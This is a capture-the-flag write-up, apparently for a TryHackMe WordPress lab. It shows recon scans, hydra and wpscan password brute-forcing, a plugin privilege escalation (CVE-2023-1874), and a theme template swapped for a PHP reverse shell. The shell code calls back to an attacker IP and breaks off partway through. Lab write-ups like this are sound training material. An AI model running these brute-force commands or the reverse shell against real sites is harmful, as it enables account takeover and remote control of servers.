# Web Hacking Phases
 
Break this secure system and get the flags, if you can.

## Reconnaissance
![cap1](cap1.png)

### Service mapping 
```bash
> nmap breakme.thm
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-16 12:53 EDT
Nmap scan report for breakme.thm (10.201.100.79)
Host is up (0.35s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
> nmap breakme.thm
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-16 12:53 EDT
Nmap scan report for breakme.thm (10.201.100.79)
Host is up (0.35s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 9.67 seconds
Nmap done: 1 IP address (1 host up) scanned in 9.67 seconds
```
### Full tcpscan 
```bash
> export ip=10.201.100.79
```
```bash
~/breakme > nmap -sC -sV -p$(nmap -p- --min-rate=2000 -T4 $ip | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed 's/, $//') $ip -oN fullscan.txt              took 3s

Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-16 13:03 EDT
Nmap scan report for breakme.thm (10.201.100.79)
Host is up (0.34s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 8e:4f:77:7f:f6:aa:6a:dc:17:c9:bf:5a:2b:eb:8c:41 (RSA)
|   256 a3:9c:66:73:fc:b9:23:c0:0f:da:1d:c9:84:d6:b1:4a (ECDSA)
|_  256 6d:c2:0e:89:25:55:10:a9:9e:41:6e:0d:81:9a:17:cb (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.56 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.73 seconds
```
### Adding to localhost 
```bash
~/breakme > echo "10.201.100.79 breakme.thm" | sudo tee -a /etc/hosts
```
TTL=61 value likely linux distros
```sh
> ping breakme.thm -c 2
PING breakme.thm (10.201.100.79) 56(84) bytes of data.
64 bytes from breakme.thm (10.201.100.79): icmp_seq=1 ttl=61 time=347 ms
64 bytes from breakme.thm (10.201.100.79): icmp_seq=2 ttl=61 time=348 ms

--- breakme.thm ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 347.077/347.670/348.264/0.593 ms
```
### Front-End Recon
### Web Application Enumeration
### Fingerprinting Web Servers
```bash
> curl -I 10.201.100.79
HTTP/1.1 200 OK
Date: Sat, 16 Aug 2025 16:42:03 GMT
Server: Apache/2.4.56 (Debian)
Last-Modified: Tue, 17 Aug 2021 21:20:21 GMT
ETag: "29cd-5c9c7e2a02b15"
Accept-Ranges: bytes
Content-Length: 10701
Vary: Accept-Encoding
Content-Type: text/html
```
### Inspecting HTTP Response Headers and Sitemaps

## Mapping and Discovery
```bash

```
![wordpress](wordpress_stack.png)


### Debugging Page Content
### Technology Stack Identification
### Directory and File Listings

## Vulnerability Analysis
### WPSCAN
```bash
> wpscan --url http://breakme.thm/wordpress
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://breakme.thm/wordpress/ [10.201.100.79]
[+] Started: Sat Aug 16 13:17:14 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.56 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://breakme.thm/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://breakme.thm/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://breakme.thm/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.4.3 identified (Insecure, released on 2024-01-30).
 | Found By: Rss Generator (Passive Detection)
 |  - http://breakme.thm/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=6.4.3</generator>
 |  - http://breakme.thm/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.4.3</generator>

[+] WordPress theme in use: twentytwentyfour
 | Location: http://breakme.thm/wordpress/wp-content/themes/twentytwentyfour/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://breakme.thm/wordpress/wp-content/themes/twentytwentyfour/readme.txt
 | [!] The version is out of date, the latest version is 1.3
 | Style URL: http://breakme.thm/wordpress/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://breakme.thm/wordpress/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.0'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] wp-data-access
 | Location: http://breakme.thm/wordpress/wp-content/plugins/wp-data-access/
 | Last Updated: 2025-07-25T00:01:00.000Z
 | [!] The version is out of date, the latest version is 5.5.45
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 5.3.5 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://breakme.thm/wordpress/wp-content/plugins/wp-data-access/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:11 <================================> (137 / 137) 100.00% Time: 00:00:11

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been out  put.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Aug 16 13:17:47 2025
[+] Requests Done: 171
[+] Cached Requests: 5
[+] Data Sent: 45.727 KB
[+] Data Received: 303.059 KB
[+] Memory used: 266.129 MB
[+] Elapsed time: 00:00:32
```
### README file
```bash
> feroxbuster -u http://breakme.thm -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --scan-dir-listings
                                                                                                                          
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://breakme.thm
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 📂  Scan Dir Listings     │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
 
200  GET  http://breakme.thm/icons/openlogo-75.png
200  GET  http://breakme.thm/
301  GET  http://breakme.thm/wordpress => http://breakme.thm/wordpress/
301  GET  http://breakme.thm/manual => http://breakme.thm/manual/
301  GET  http://breakme.thm/manual/images => http://breakme.thm/manual/images/
200  GET  http://breakme.thm/manual/images/mod_filter_old.png
200  GET  http://breakme.thm/manual/images/ssl_intro_fig2.png
200  GET  http://breakme.thm/manual/images/right.gif
200  GET  http://breakme.thm/manual/images/mod_rewrite_fig2.png
200  GET  http://breakme.thm/manual/images/home.gif
200  GET  http://breakme.thm/manual/images/mod_rewrite_fig2.gif
200  GET  http://breakme.thm/manual/images/left.gif
200  GET  http://breakme.thm/manual/images/mod_filter_new.png
301  GET  http://breakme.thm/manual/en => http://breakme.thm/manual/en/
200  GET  http://breakme.thm/manual/images/filter_arch.tr.png
200  GET  http://breakme.thm/manual/images/caching_fig1.tr.png
200  GET  http://breakme.thm/manual/images/caching_fig1.gif
200  GET  http://breakme.thm/manual/images/index.gif
200  GET  http://breakme.thm/manual/images/ssl_intro_fig3.png
200  GET  http://breakme.thm/manual/images/syntax_rewritecond.png
200  GET  http://breakme.thm/manual/images/up.gif
200  GET  http://breakme.thm/manual/images/favicon.ico
200  GET  http://breakme.thm/manual/images/filter_arch.png
200  GET  http://breakme.thm/manual/images/ssl_intro_fig3.gif
200  GET  http://breakme.thm/manual/images/mod_rewrite_fig1.png
200  GET  http://breakme.thm/manual/images/ssl_intro_fig2.gif
200  GET  http://breakme.thm/manual/style/manualpage.dtd
200  GET  http://breakme.thm/manual/style/lang.dtd
200  GET  http://breakme.thm/manual/style/modulesynopsis.dtd
200  GET  http://breakme.thm/manual/style/sitemap.dtd
200  GET  http://breakme.thm/manual/style/common.dtd.gz
200  GET  http://breakme.thm/manual/style/version.ent
200  GET  http://breakme.thm/manual/style/build.properties
200  GET  http://breakme.thm/manual/style/faq.dtd
200  GET  http://breakme.thm/manual/images/custom_errordocs.png
200  GET  http://breakme.thm/manual/images/build_a_mod_3.png
200  GET  http://breakme.thm/manual/images/syntax_rewriterule.png
200  GET  http://breakme.thm/manual/images/mod_filter_new.gif
200  GET  http://breakme.thm/manual/images/down.gif
200  GET  http://breakme.thm/manual/images/apache_header.gif
200  GET  http://breakme.thm/manual/images/mod_filter_new.tr.png
200  GET  http://breakme.thm/manual/images/sub.gif
200  GET  http://breakme.thm/manual/images/pixel.gif
200  GET  http://breakme.thm/manual/images/mod_rewrite_fig1.gif
200  GET  http://breakme.thm/manual/images/reverse-proxy-arch.png
200  GET  http://breakme.thm/manual/images/feather.gif
301  GET  http://breakme.thm/manual/style/css => http://breakme.thm/manual/style/css/
301  GET  http://breakme.thm/manual/style => http://breakme.thm/manual/style/
200  GET  http://breakme.thm/manual/images/bal-man-w.png
200  GET  http://breakme.thm/manual/images/caching_fig1.png
200  GET  http://breakme.thm/manual/images/rewrite_rule_flow.png
200  GET  http://breakme.thm/manual/images/build_a_mod_4.png
200  GET  http://breakme.thm/manual/images/feather.png
301  GET  http://breakme.thm/manual/ru => http://breakme.thm/manual/ru/
200  GET  http://breakme.thm/manual/images/bal-man.png
200  GET  http://breakme.thm/manual/images/build_a_mod_2.png
200  GET  http://breakme.thm/manual/images/rewrite_process_uri.png
301  GET  http://breakme.thm/manual/ja => http://breakme.thm/manual/ja/
301  GET  http://breakme.thm/manual/tr => http://breakme.thm/manual/tr/
301  GET  http://breakme.thm/manual/ko => http://breakme.thm/manual/ko/
301  GET  http://breakme.thm/manual/de => http://breakme.thm/manual/de/
301  GET  http://breakme.thm/manual/fr => http://breakme.thm/manual/fr/
200  GET  http://breakme.thm/manual/images/ssl_intro_fig1.png
200  GET  http://breakme.thm/manual/images/ssl_intro_fig1.gif
200  GET  http://breakme.thm/manual/images/mod_filter_old.gif
200  GET  http://breakme.thm/manual/images/rewrite_backreferences.png
200  GET  http://breakme.thm/manual/images/bal-man-b.png
200  GET  http://breakme.thm/manual/images/SupportApache-small.png
301  GET  http://breakme.thm/manual/de/ssl => http://breakme.thm/manual/de/ssl/
301  GET  http://breakme.thm/manual/es => http://breakme.thm/manual/es/
301  GET  http://breakme.thm/manual/fr/misc => http://breakme.thm/manual/fr/misc/
301  GET  http://breakme.thm/manual/de/misc => http://breakme.thm/manual/de/misc/
301  GET  http://breakme.thm/manual/en/misc => http://breakme.thm/manual/en/misc/
301  GET  http://breakme.thm/manual/style/scripts => http://breakme.thm/manual/style/scripts/
301  GET  http://breakme.thm/manual/de/mod => http://breakme.thm/manual/de/mod/
301  GET  http://breakme.thm/manual/es/misc => http://breakme.thm/manual/es/misc/
301  GET  http://breakme.thm/manual/ru/ssl => http://breakme.thm/manual/ru/ssl/
301  GET  http://breakme.thm/manual/en/ssl => http://breakme.thm/manual/en/ssl/
301  GET  http://breakme.thm/manual/da => http://breakme.thm/manual/da/
301  GET  http://breakme.thm/manual/de/faq => http://breakme.thm/manual/de/faq/
301  GET  http://breakme.thm/manual/ja/misc => http://breakme.thm/manual/ja/misc/
301  GET  http://breakme.thm/wordpress/wp-includes => http://breakme.thm/wordpress/wp-includes/
301  GET  http://breakme.thm/wordpress/wp-content => http://breakme.thm/wordpress/wp-content/
301  GET  http://breakme.thm/wordpress/wp-admin => http://breakme.thm/wordpress/wp-admin/
301  GET  http://breakme.thm/manual/ru/faq => http://breakme.thm/manual/ru/faq/
301  GET  http://breakme.thm/manual/ru/mod => http://breakme.thm/manual/ru/mod/
301  GET  http://breakme.thm/manual/en/mod => http://breakme.thm/manual/en/mod/
301  GET  http://breakme.thm/manual/ko/misc => http://breakme.thm/manual/ko/misc/
301  GET  http://breakme.thm/manual/en/faq => http://breakme.thm/manual/en/faq/
301  GET  http://breakme.thm/manual/da/misc => http://breakme.thm/manual/da/misc/
301  GET  http://breakme.thm/wordpress/wp-content/plugins => http://breakme.thm/wordpress/wp-content/plugins/
301  GET  http://breakme.thm/wordpress/wp-content/themes => http://breakme.thm/wordpress/wp-content/themes/
301  GET  http://breakme.thm/wordpress/wp-admin/images => http://breakme.thm/wordpress/wp-admin/images/
301  GET  http://breakme.thm/wordpress/wp-admin/includes => http://breakme.thm/wordpress/wp-admin/includes/
301  GET  http://breakme.thm/wordpress/wp-admin/js => http://breakme.thm/wordpress/wp-admin/js/
301  GET  http://breakme.thm/wordpress/wp-admin/css => http://breakme.thm/wordpress/wp-admin/css/
301  GET  http://breakme.thm/wordpress/wp-admin/user => http://breakme.thm/wordpress/wp-admin/user/
301  GET  http://breakme.thm/manual/style/latex => http://breakme.thm/manual/style/latex/
301  GET  http://breakme.thm/wordpress/wp-includes/js => http://breakme.thm/wordpress/wp-includes/js/
301  GET  http://breakme.thm/wordpress/wp-includes/images => http://breakme.thm/wordpress/wp-includes/images/
301  GET  http://breakme.thm/wordpress/wp-includes/css => http://breakme.thm/wordpress/wp-includes/css/
301  GET  http://breakme.thm/wordpress/wp-includes/assets => http://breakme.thm/wordpress/wp-includes/assets/
301  GET  http://breakme.thm/wordpress/wp-content/uploads => http://breakme.thm/wordpress/wp-content/uploads/
301  GET  http://breakme.thm/manual/es/faq => http://breakme.thm/manual/es/faq/
301  GET  http://breakme.thm/manual/tr/faq => http://breakme.thm/manual/tr/faq/
301  GET  http://breakme.thm/manual/tr/rewrite => http://breakme.thm/manual/tr/rewrite/

```

### Security Testing
![admin](admin-login.png)

### Bruteforcing password (hydra http-post) 
> user admin
```bash
# grab failure string, exact error message that shows only when the login fails.
curl -s -X POST http://breakme.thm/wordpress/wp-login.php \
  -d "log=admin&pwd=wrongpassword&wp-submit=Log+In" | grep -i error

```
### Grab usernames
```bash
cewl -d 2 http://breakme.thm/wordpress/ -w usernames.txt
```
```bash
> hydra -l admin -P /usr/share/wordlists/rockyou.txt breakme.thm http-post-form \
"/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:login_error" -V -f >/dev/null
```

#  Vulnerability Identification
###  Vulnerable to information disclosure (IDOR)
![user-admin](user-admin.png)

### Bruteforcing password 
```bash
> wpscan --url http://breakme.thm/wordpress -U admin,bob -P /usr/share/wordlists/rockyou.txt

[+] Performing password attack on Wp Login against 2 user/s
[SUCCESS] - bob / soccer
```
![bob](bob.png)

### WPSCAN further enumeration 
```bash
export WPSCAN_API_TOKEN=redacted  
```
```bash
> wpscan --url http://breakme.thm/wordpress
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://breakme.thm/wordpress/ [10.201.13.222]
[+] Started: Sun Aug 17 10:07:05 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.56 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://breakme.thm/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://breakme.thm/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://breakme.thm/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.4.3 identified (Insecure, released on 2024-01-30).
 | Found By: Rss Generator (Passive Detection)
 |  - http://breakme.thm/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=6.4.3</generator>
 |  - http://breakme.thm/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.4.3</generator>
 |
 | [!] 4 vulnerabilities identified:
 |
 | [!] Title: WP < 6.5.2 - Unauthenticated Stored XSS
 |     Fixed in: 6.4.4
 |     References:
 |      - https://wpscan.com/vulnerability/1a5c5df1-57ee-4190-a336-b0266962078f
 |      - https://wordpress.org/news/2024/04/wordpress-6-5-2-maintenance-and-security-release/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Stored XSS in HTML API
 |     Fixed in: 6.4.5
 |     References:
 |      - https://wpscan.com/vulnerability/2c63f136-4c1f-4093-9a8c-5e51f19eae28
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Stored XSS in Template-Part Block
 |     Fixed in: 6.4.5
 |     References:
 |      - https://wpscan.com/vulnerability/7c448f6d-4531-4757-bff0-be9e3220bbbb
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Path Traversal in Template-Part Block
 |     Fixed in: 6.4.5
 |     References:
 |      - https://wpscan.com/vulnerability/36232787-754a-4234-83d6-6ded5e80251c
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/

[+] WordPress theme in use: twentytwentyfour
 | Location: http://breakme.thm/wordpress/wp-content/themes/twentytwentyfour/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://breakme.thm/wordpress/wp-content/themes/twentytwentyfour/readme.txt
 | [!] The version is out of date, the latest version is 1.3
 | Style URL: http://breakme.thm/wordpress/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://breakme.thm/wordpress/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.0'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] wp-data-access
 | Location: http://breakme.thm/wordpress/wp-content/plugins/wp-data-access/
 | Last Updated: 2025-08-16T11:12:00.000Z
 | [!] The version is out of date, the latest version is 5.5.49
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 5 vulnerabilities identified:
 |
 | [!] Title: WP Data Access < 5.3.8 - Subscriber+ Privilege Escalation
 |     Fixed in: 5.3.8
 |     References:
 |      - https://wpscan.com/vulnerability/7871b890-5172-40aa-88f2-a1b95e240ad4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-1874
 |      - https://www.wordfence.com/blog/2023/04/privilege-escalation-vulnerability-patched-promptly-in-wp-data-access-wordpress-plugin/
 |
 | [!] Title: Freemius SDK < 2.5.10 - Reflected Cross-Site Scripting
 |     Fixed in: 5.3.11
 |     References:
 |      - https://wpscan.com/vulnerability/39d1f22f-ea34-4d94-9dc2-12661cf69d36
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-33999
 |
 | [!] Title: WP Data Access < 5.5.9 - Cross-Site Request Forgery
 |     Fixed in: 5.5.9
 |     References:
 |      - https://wpscan.com/vulnerability/4fe0d330-6511-4500-ac3f-b9bb944b8f0e
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-43295
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/85a33508-71f2-4aa1-8d51-667eb0690fbd
 |
 | [!] Title: WP Data Access – App, Table, Form and Chart Builder plugin < 5.5.23 - Unauthenticated SQL Injection
 |     Fixed in: 5.5.23
 |     References:
 |      - https://wpscan.com/vulnerability/2c35b255-9f6b-47c2-b3be-56e49b9a9961
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-12428
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/a1708d6e-14f5-418f-81eb-f9269159b5b1
 |
 | [!] Title: WP Data Access < 5.5.37 - Authenticated (Contributor+) Stored Cross-Site Scripting
 |     Fixed in: 5.5.37
 |     References:
 |      - https://wpscan.com/vulnerability/6a48d064-a325-42b1-a5fa-024f39bbef22
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-39582
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/e8260829-49a6-4ec0-8771-25d1cce8cc8c
 |
 | Version: 5.3.5 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://breakme.thm/wordpress/wp-content/plugins/wp-data-access/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:11 <=========================> (137 / 137) 100.00% Time: 00:00:11

[i] No Config Backups Found.

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 3
 | Requests Remaining: 22

[+] Finished: Sun Aug 17 10:07:35 2025
[+] Requests Done: 176
[+] Cached Requests: 5
[+] Data Sent: 47.815 KB
[+] Data Received: 313.257 KB
[+] Memory used: 249.125 MB
[+] Elapsed time: 00:00:30
```
### Vulnerable plugin
```bash
# default scanning 
[+] wp-data-access
 | Location: http://breakme.thm/wordpress/wp-content/plugins/wp-data-access/
 | Last Updated: 2025-08-16T11:12:00.000Z
 | [!] The version is out of date, the latest version is 5.5.49
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 5.3.5 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://breakme.thm/wordpress/wp-content/plugins/wp-data-access/readme.txt
```
```bash
[!] Title: WP Data Access < 5.3.8 - Subscriber+ Privilege Escalation
 |     Fixed in: 5.3.8
 |     References:
 |      - https://wpscan.com/vulnerability/7871b890-5172-40aa-88f2-a1b95e240ad4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-1874
 |      - https://www.wordfence.com/blog/2023/04/privilege-escalation-vulnerability-patched-promptly-in-wp-data-access-wordpress-plugin/
``` 
### CVE details 
> CVE-2023-1874
```bash
> sploitscan CVE-2023-1874

███████╗██████╗ ██╗      ██████╗ ██╗████████╗███████╗ ██████╗ █████╗ ███╗   ██╗
██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝██╔════╝██╔════╝██╔══██╗████╗  ██║
███████╗██████╔╝██║     ██║   ██║██║   ██║   ███████╗██║     ███████║██╔██╗ ██║
╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║   ╚════██║██║     ██╔══██║██║╚██╗██║
███████║██║     ███████╗╚██████╔╝██║   ██║   ███████║╚██████╗██║  ██║██║ ╚████║
╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
v0.10.5 / Alexander Hagenah / @xaitax / ah@primepage.de

╔═══════════════════════╗
║ CVE ID: CVE-2023-1874 ║
╚═══════════════════════╝

┌───[ 🔍 Vulnerability information ]
|
├ Published:   2023-04-12
├ Base Score:  7.5 (HIGH)
├ Vector:      CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H
└ Description: The WP Data Access plugin for WordPress is vulnerable to privilege escalation in versions up to, and
               including, 5.3.7. This is due to a lack of authorization checks on the
               multiple_roles_update function. This makes it possible for authenticated attackers,
               with minimal permissions such as a subscriber, to modify their user role by supplying
               the 'wpda_role[]' parameter during a profile update. This requires the 'Enable role
               management' setting to be enabled for the site.

┌───[ ♾️ Exploit Prediction Score (EPSS) ]
|
└ EPSS Score:  5.29% Probability of exploitation.

┌───[ 🛡️ CISA KEV Catalog ]
|
└ ❌ No data found.

┌───[ 💣 Public Exploits (Total: 0) ]
|
│
└ Other
   └ PacketStorm: https://packetstormsecurity.com/search/?q=CVE-2023-1874

┌───[ 🕵️ HackerOne Hacktivity ]
|
├ Rank:        7954
├ Reports:     0
└ Severity:    Unknown: 0 / None: 0 / Low: 0 / Medium: 0 / High: 0 / Critical: 0

┌───[ 🤖 AI-Powered Risk Assessment ]
|
|                                     
| ❌ OpenAI API key is not configured correctly.
|
└────────────────────────────────────────

┌───[ ⚠️ Patching Priority Rating ]
|
└ Priority:     B

┌───[ 📚 Further References ]
|
├ https://www.wordfence.com/threat-intel/vulnerabilities/id/8f562e33-2aef-46f0-8a65-691155ede9e7?source=cve
├ https://plugins.trac.wordpress.org/browser/wp-data-access/tags/5.3.7/WPDataRoles/WPDA_Roles.php#L50
├ https://plugins.trac.wordpress.org/browser/wp-data-access/tags/5.3.8/WPDataRoles/WPDA_Roles.php#L50
├ https://plugins.trac.wordpress.org/browser/wp-data-access/tags/5.3.8/WPDataRoles/WPDA_Roles.php#L23
└ http://packetstormsecurity.com/files/171825/WordPress-WP-Data-Access-5.3.7-Privilege-Escalation.html
```
![packetstorm](packetstorm.png)
![dashboard_bob](dashboard_bob.png)

### Administrator privilege
> intercept update profile 
![administrator](administrator.png)
![admin_dashboard](admin_dashboard.png)

## Exploitation
> by editing this themes and replace php reverse shell we are able to obtain foothold
```bash
[+] WordPress theme in use: twentytwentyfour
 | Location: http://breakme.thm/wordpress/wp-content/themes/twentytwentyfour/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://breakme.thm/wordpress/wp-content/themes/twentytwentyfour/readme.txt
 | [!] The version is out of date, the latest version is 1.3
 | Style URL: http://breakme.thm/wordpress/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://breakme.thm/wordpress/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.0'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)
```
![2024_theme](twentytwentyfour_theme.png)

### 404 path 
```bash
http://breakme.thm/wordpress/wp-content/themes/twentytwentyfour/templates/404.html
```
![test](test.png)
![test_result](test_result.png)

### Testing Twentytwentyone themes 
While testing the Twenty Twenty-Four theme, we were unable to obtain a reverse shell because it does not include a 404.php file.
![2021_theme](2021_theme.png)

> revshell.php
```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.23.93.75';
$port = 9001;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/bash -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
